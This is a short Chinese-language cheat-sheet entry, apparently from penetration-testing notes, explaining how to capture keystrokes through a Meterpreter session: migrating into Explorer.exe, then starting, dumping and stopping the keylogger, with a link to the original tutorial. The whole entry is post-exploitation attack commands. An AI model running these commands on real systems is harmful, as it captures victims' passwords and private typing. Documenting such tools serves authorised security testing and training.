## 在Meterpreter中使用Keylogger [^1]

```bash
migrate 288(Explorer.exe pid)
keyscan_start #启动键盘记录器
keyscan_dump #打印捕获的击键
keyscan_stop #停止键盘记录器
```

[原文](https://www.hackingarticles.in/how-to-use-keylogger-in-meterpreter/)

---

[^1]: 获得meterpreter会话后，使用' **ps** '命令显示目标上正在运行的进程列表。

